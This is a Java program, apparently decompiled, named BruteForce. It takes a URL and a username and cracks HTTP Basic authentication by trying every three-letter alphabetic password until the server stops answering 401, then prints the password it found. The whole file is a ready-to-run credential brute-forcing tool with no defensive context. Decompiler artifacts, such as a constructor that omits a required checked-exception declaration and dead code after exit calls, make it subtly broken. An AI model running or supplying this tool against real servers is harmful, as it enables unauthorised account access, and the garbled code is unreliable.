public class BruteForce extends java.net.Authenticator {
    private String f00;
    private java.net.URL f10;
    private char[] f20;
    private char[] f30;
    public static void main ( String[] a ) {
        BruteForce a0 = null;
        if ( a.length != 2 ) {
            System.err.println ( "usage: BruteForce <url> <username>" );
            System.exit ( 1 );
        }
        String s = a[0];
        String s0 = a[1];
        try {
            a0 = new BruteForce ( s, s0 );
        } catch ( java.net.MalformedURLException a1 ) {
            a1.printStackTrace();
            System.exit ( 1 );
            a0 = null;
        }
        a0.m00();
        System.exit ( 0 );
    }
    public BruteForce ( String s, String s0 ) {
        super();
        this.f10 = new java.net.URL ( s );
        this.f00 = s0;
        char[] a = new char[1];
        a[0] = ( char ) 97;
        this.f20 = a;
    }
    public void m00() {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) this );
        java.net.URL a = this.f10;
        try {
            java.net.HttpURLConnection a0 = ( java.net.HttpURLConnection ) a.openConnection();
            a0.connect();
            while ( a0.getResponseCode() == 401 ) {
                if ( this.f20 == null ) {
                    break;
                }
                label0: {
                    NullPointerException a1 = null;
                    try {
                        try {
                            a0.getInputStream();
                            a0.connect();
                            continue;
                        } catch ( java.net.ProtocolException ignoredException ) {
                            break label0;
                        }
                    } catch ( NullPointerException a2 ) {
                        a1 = a2;
                    }
                    a1.printStackTrace();
                    System.exit ( 1 );
                    continue;
                }
                a0 = ( java.net.HttpURLConnection ) this.f10.openConnection();
            }
        } catch ( java.io.IOException a3 ) {
            a3.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( new StringBuilder().append ( "password=" ).append ( new String ( this.f30 ) ).toString() );
    }
    public java.net.PasswordAuthentication getPasswordAuthentication() {
        this.m20();
        return new java.net.PasswordAuthentication ( this.f00, this.f30 );
    }
    public void m20() {
        if ( this.f30 == null ) {
            char[] a = new char[3];
            a[0] = ( char ) 65;
            a[1] = ( char ) 65;
            a[2] = ( char ) 65;
            this.f30 = a;
            char[] a0 = new char[3];
            a0[0] = ( char ) 65;
            a0[1] = ( char ) 65;
            a0[2] = ( char ) 66;
            this.f20 = a0;
            return;
        }
        this.f30 = this.f20;
        int i = this.f20[2];
        if ( i == 90 ) {
            this.f20[2] = ( char ) 97;
            return;
        }
        int i0 = this.f20[2];
        if ( i0 == 122 ) {
            this.f20[2] = ( char ) 65;
            int i1 = this.f20[1];
            if ( i1 != 90 ) {
                int i2 = this.f20[1];
                if ( i2 == 122 ) {
                    this.f20[1] = ( char ) 65;
                    int i3 = this.f20[0];
                    if ( i3 != 90 ) {
                        int i4 = this.f20[0];
                        if ( i4 == 122 ) {
                            this.f20 = null;
                        } else {
                            int i5 = this.f20[0];
                            int i6 = i5 + 1;
                            char[] a1 = this.f20;
                            int i7 = ( char ) i6;
                            a1[0] = ( char ) i7;
                        }
                    } else {
                        this.f20[0] = ( char ) 97;
                    }
                } else {
                    int i8 = this.f20[1];
                    int i9 = i8 + 1;
                    char[] a2 = this.f20;
                    int i10 = ( char ) i9;
                    a2[1] = ( char ) i10;
                }
            } else {
                this.f20[1] = ( char ) 97;
            }
        } else {
            int i11 = this.f20[2];
            int i12 = i11 + 1;
            char[] a3 = this.f20;
            int i13 = ( char ) i12;
            a3[2] = ( char ) i13;
        }
    }
}
